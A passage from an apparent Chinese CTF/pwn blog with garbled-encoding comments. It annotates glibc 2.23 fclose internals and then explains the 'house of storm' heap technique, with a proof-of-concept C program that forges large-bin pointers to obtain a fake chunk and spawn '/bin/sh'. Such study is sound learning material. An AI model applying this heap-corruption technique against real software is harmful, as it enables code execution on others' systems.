EOF);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span><br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> _IO_old_fclose (fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//æ­¥éª¤ä¸€ï¼šè°ƒç”¨_IO_un_linkå°†fpä»_IO_list_allå•é“¾è¡¨ä¸­æ‘˜é™¤</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br><br>  _IO_acquire_lock (fp);<br><span class="hljs-comment">//æ­¥éª¤äºŒï¼šå…³é—­æ–‡ä»¶å¹¶é‡Šæ”¾ç¼“å†²åŒº</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    status = _IO_file_close_it (fp);<br>  <span class="hljs-keyword">else</span><br>    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="hljs-number">-1</span> : <span class="hljs-number">0</span>;<br>  _IO_release_lock (fp);<br><span class="hljs-comment">//æ­¥éª¤ä¸‰ï¼šç¡®å®š_IO_FILEå·²ä»é“¾è¡¨ä¸­å–å‡ºä¸”ç¼“å†²åŒºå·²é‡Šæ”¾</span><br>  _IO_FINISH (fp);<br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode &gt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _LIBC</span><br>      <span class="hljs-comment">/* This stream has a wide orientation.  This means we have to free</span><br><span class="hljs-comment"> the conversion functions.  */</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *<span class="hljs-title">cc</span> =</span> fp-&gt;_codecvt;<br><br>      __libc_lock_lock (__gconv_lock);<br>      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);<br>      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);<br>      __libc_lock_unlock (__gconv_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (_IO_have_backup (fp))<br>_IO_free_backup_area (fp);<br>    &#125;<br><span class="hljs-comment">//æ­¥éª¤å››ï¼šå¦‚æœfpä¸æ˜¯æ ‡å‡†è¾“å…¥ã€è¾“å‡ºæˆ–é”™è¯¯ï¼Œåˆ™é‡Šæ”¾fpç»“æ„ä½“</span><br>  <span class="hljs-keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)<br>    &#123;<br>      fp-&gt;_IO_file_flags = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">free</span>(fp);<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="IO-un-link-1"><a href="#IO-un-link-1" class="headerlink" title="_IO_un_link"></a>_IO_un_link</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_un_link (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> **<span class="hljs-title">f</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (_IO_FILE *) fp;<br>      _IO_flockfile ((_IO_FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//å¦‚æœ_IO_list_alléç©ºä¸”å¤´èŠ‚ç‚¹ä¸ºfpåˆ™å–ä¸‹å¤´èŠ‚ç‚¹</span><br>      <span class="hljs-keyword">if</span> (_IO_list_all == <span class="hljs-literal">NULL</span>)<br>;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp == _IO_list_all)<br>&#123;<br>  _IO_list_all = (<span class="hljs-keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;<br>  ++_IO_list_all_stamp;<br>&#125;<br><span class="hljs-comment">//å¦åˆ™éå†å•é“¾è¡¨æœç´¢fpå¹¶å–ä¸‹ï¼Œä¿®æ”¹æ ‡å¿—ä½</span><br>      <span class="hljs-keyword">else</span><br><span class="hljs-keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)<br>  <span class="hljs-keyword">if</span> (*f == (_IO_FILE *) fp)<br>    &#123;<br>      *f = fp-&gt;file._chain;<br>      ++_IO_list_all_stamp;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>      fp-&gt;file._flags &amp;= ~_IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((_IO_FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-file-close-it"><a href="#IO-file-close-it" class="headerlink" title="_IO_file_close_it"></a>_IO_file_close_it</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c </span><br><br><span class="hljs-type">int</span><br>_IO_new_file_close_it (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-type">int</span> write_status;<br>  <span class="hljs-keyword">if</span> (!_IO_file_is_open (fp))<br>    <span class="hljs-keyword">return</span> EOF;<br><br><span class="hljs-comment">//è°ƒç”¨_IO_do_flushï¼ˆ_IO_do_writeï¼‰åˆ·æ–°ç¼“å†²åŒº</span><br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="hljs-number">0</span><br>      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="hljs-number">0</span>)<br>    write_status = _IO_do_flush (fp);<br>  <span class="hljs-keyword">else</span><br>    write_status = <span class="hljs-number">0</span>;<br><br>  _IO_unsave_markers (fp);<br><br><span class="hljs-comment">//è°ƒç”¨_IO_SYSCLOSEï¼Œè·³è½¬è¡¨ä¸­çš„_IO_file_close</span><br>  <span class="hljs-type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="hljs-number">0</span><br>      ? _IO_SYSCLOSE (fp) : <span class="hljs-number">0</span>);<br><br>  <span class="hljs-comment">/* Free buffer. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (_IO_have_wbackup (fp))<br>_IO_free_wbackup_area (fp);<br>      _IO_wsetb (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>      _IO_wsetg (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>      _IO_wsetp (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//é‡Šæ”¾è¾“å…¥è¾“å‡ºç¼“å†²åŒºå¹¶è®¾ç½®æŒ‡é’ˆ</span><br>  _IO_setb (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//è®¾ç½®baseæŒ‡é’ˆï¼Œå¹¶é‡Šæ”¾ç¼“å†²åŒº</span><br>  _IO_setg (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//ç½®ç©ºè¾“å…¥ç¼“å†²åŒº</span><br>  _IO_setp (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//ç½®ç©ºè¾“å‡ºç¼“å†²åŒº</span><br><br><span class="hljs-comment">//å†æ¬¡è°ƒç”¨_IO_un_linkï¼Œç¡®ä¿ç»“æ„ä½“å·²ä»å•é“¾è¡¨ä¸­å–ä¸‹</span><br>  _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br><span class="hljs-comment">//æ›´æ–°ç›¸å…³ç»“æ„ä½“æˆå‘˜</span><br>  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;<br>  fp-&gt;_fileno = <span class="hljs-number">-1</span>;<br>  fp-&gt;_offset = _IO_pos_BAD;<br><br>  <span class="hljs-keyword">return</span> close_status ? close_status : write_status;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-file-close"><a href="#IO-file-close" class="headerlink" title="_IO_file_close"></a>_IO_file_close</h3><p>ç›´æ¥è¿›è¡Œç³»ç»Ÿè°ƒç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">int</span><br>_IO_file_close (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">return</span> close_not_cancel (fp-&gt;_fileno);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-setb-1"><a href="#IO-setb-1" class="headerlink" title="_IO_setb"></a>_IO_setb</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c </span><br><br><span class="hljs-type">void</span><br>_IO_setb (_IO_FILE *f, <span class="hljs-type">char</span> *b, <span class="hljs-type">char</span> *eb, <span class="hljs-type">int</span> a)<br>&#123;<br><span class="hljs-comment">//é‡Šæ”¾ç¼“å†²åŒº</span><br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<br>    <span class="hljs-built_in">free</span> (f-&gt;_IO_buf_base);<br><span class="hljs-comment">//ç½®ç©ºç¼“å†²åŒºæŒ‡é’ˆ</span><br>  f-&gt;_IO_buf_base = b;<br>  f-&gt;_IO_buf_end = eb;<br><span class="hljs-comment">//è®¾ç½®ç›¸å…³æ ‡å¿—ä½</span><br>  <span class="hljs-keyword">if</span> (a)<br>    f-&gt;_flags &amp;= ~_IO_USER_BUF;<br>  <span class="hljs-keyword">else</span><br>    f-&gt;_flags |= _IO_USER_BUF;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-new-file-finish"><a href="#IO-new-file-finish" class="headerlink" title="_IO_new_file_finish"></a>_IO_new_file_finish</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">void</span><br>_IO_new_file_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (_IO_file_is_open (fp))<br>    &#123;<br><span class="hljs-comment">//åˆ·æ–°ç¼“å†²åŒº</span><br>      _IO_do_flush (fp);<br><span class="hljs-comment">//å¦‚æœæ–‡ä»¶ä¸ºå…³é—­ï¼Œåˆ™è°ƒç”¨_IO_SYSCLOSEå…³é—­æ–‡ä»¶</span><br>      <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))<br>_IO_SYSCLOSE (fp);<br>    &#125;<br><span class="hljs-comment">//è°ƒç”¨_IO_default_finishç¡®è®¤ç¼“å†²åŒºå·²é‡Šæ”¾ä¸”ç»“æ„ä½“ä¸åœ¨å•é“¾è¡¨ä¸­</span><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-default-finish"><a href="#IO-default-finish" class="headerlink" title="_IO_default_finish"></a>_IO_default_finish</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_default_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *<span class="hljs-title">mark</span>;</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    &#123;<br>      <span class="hljs-built_in">free</span> (fp-&gt;_IO_buf_base);<br>      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="hljs-literal">NULL</span>; mark = mark-&gt;_next)<br>    mark-&gt;_sbuf = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base)<br>    &#123;<br>      <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>      fp-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_lock != <span class="hljs-literal">NULL</span>)<br>    _IO_lock_fini (*fp-&gt;_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>IO</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io</tag>
      
      <tag>source code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of storm</title>
    <link href="/2023/02/08/house-of-storm/"/>
    <url>/2023/02/08/house-of-storm/</url>
    
    <content type="html"><![CDATA[<p>åšhgameçš„æ—¶å€™æœ‰æœåˆ°è¿‡ï¼Œç°åœ¨æ¥ç ”ç©¶ä¸€ä¸‹</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>ä¸»è¦åˆ©ç”¨çš„å°±æ˜¯_int_mallocä¸­æ•´ç†unsorted binå°†chunkæ”¾è¿›large binçš„è¿‡ç¨‹ï¼Œå®ç°æ•ˆæœä¸ºä¼ªé€ ä¸€ä¸ªåˆæ³•çš„chunké“¾å…¥unsorted bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">     <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>       &#123;<br>         bck = victim-&gt;bk;<br><span class="hljs-comment">//æ£€æŸ¥chunkçš„å¤§å°æ˜¯å¦ç¬¦åˆunsorted bin</span><br>         <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>             || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>           malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                            chunk2mem (victim), av);<br>         size = chunksize (victim);<br><br>â€¦â€¦<br><br><br><span class="hljs-comment">//ä»unsorted binä¸­æ‘˜ä¸‹æœ€åä¸€ä¸ªéå†è¿‡çš„chunk</span><br>         unsorted_chunks (av)-&gt;bk = bck;<br>         bck-&gt;fd = unsorted_chunks (av);<br><br><br>â€¦â€¦<br><br><span class="hljs-comment">//å¦åˆ™æ”¾è¿›large bin</span><br>         <span class="hljs-keyword">else</span><br>           &#123;<br>             victim_index = largebin_index (size);<br>             bck = bin_at (av, victim_index);<span class="hljs-comment">//ç¬¬ä¸€ä¸ªå°é“¾è¡¨</span><br>             fwd = bck-&gt;fd;<span class="hljs-comment">//ç¬¬äºŒä¸ªå°é“¾è¡¨</span><br><br>             <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>             <span class="hljs-keyword">if</span> (fwd != bck)<span class="hljs-comment">//é“¾è¡¨ä¸ç©º</span><br>               &#123;<br>                 <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                 size |= PREV_INUSE;<br>                 <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                 assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                 <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<span class="hljs-comment">//æ¯”æœ€å°çš„è¿˜å°</span><br>                   &#123;<br><br>â€¦â€¦<br><br>&#125;<br>                 <span class="hljs-keyword">else</span><br>                   &#123;<br>                     assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                     <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                       &#123;<br>                         fwd = fwd-&gt;fd_nextsize;<br>                         assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                       &#125;<span class="hljs-comment">//æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ¯”victimå°çš„</span><br><br>                     <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                       <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                       fwd = fwd-&gt;fd;<br>                     <span class="hljs-keyword">else</span><br>                       &#123;<br>                         victim-&gt;fd_nextsize = fwd;<br>                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                         fwd-&gt;bk_nextsize = victim;<br>                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//æ¥å…¥nextsizeé“¾</span><br>                       &#125;<br>                     bck = fwd-&gt;bk;<br>                   &#125;<br>               &#125;<br>             <span class="hljs-keyword">else</span><span class="hljs-comment">//å¦‚æœé“¾ç©º</span><br>               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>           &#125;<br><span class="hljs-comment">//æ¥å…¥biné“¾</span><br>         mark_bin (av, victim_index);<span class="hljs-comment">//æ ‡è¯†binmap</span><br>         victim-&gt;bk = bck;<br>         victim-&gt;fd = fwd;<br>         fwd-&gt;bk = victim;<br>         bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="2-27ä»¥å‰"><a href="#2-27ä»¥å‰" class="headerlink" title="2.27ä»¥å‰"></a>2.27ä»¥å‰</h2><p><a href="https://www.cnblogs.com/Rookle/p/13140339.html">å®éªŒä»£ç </a>å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  presize;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  fd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  bk;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  fd_nextsize;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  bk_nextsize;<br>&#125;chunk;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *large_chunk,*unsorted_chunk;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *fake_chunk = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;chunk;<br>    <span class="hljs-type">char</span> *ptr;<br><br><br>    unsorted_chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0X20</span>);<br>    large_chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x408</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br><br><br>    <span class="hljs-built_in">free</span>(large_chunk);<br>    <span class="hljs-built_in">free</span>(unsorted_chunk);<br>    unsorted_chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);  <span class="hljs-comment">//large_chunkå½’ä½</span><br>    <span class="hljs-built_in">free</span>(unsorted_chunk);  <span class="hljs-comment">// unsorted_chunkå½’ä½</span><br><br><span class="hljs-comment">//é‡ç‚¹ä¸€ä¸‹3æ­¥</span><br>    unsorted_chunk[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )fake_chunk;<br>    large_chunk[<span class="hljs-number">1</span>]    = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )fake_chunk+<span class="hljs-number">8</span>;<br>    large_chunk[<span class="hljs-number">3</span>]    = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )fake_chunk<span class="hljs-number">-0x18</span><span class="hljs-number">-5</span>;<br><br>    <br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x48</span>);<br>    <span class="hljs-built_in">strncpy</span>(ptr, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-number">0x10</span>);<br>    system(((<span class="hljs-type">char</span> *)fake_chunk + <span class="hljs-number">0x10</span>));<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‡ç‚¹è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 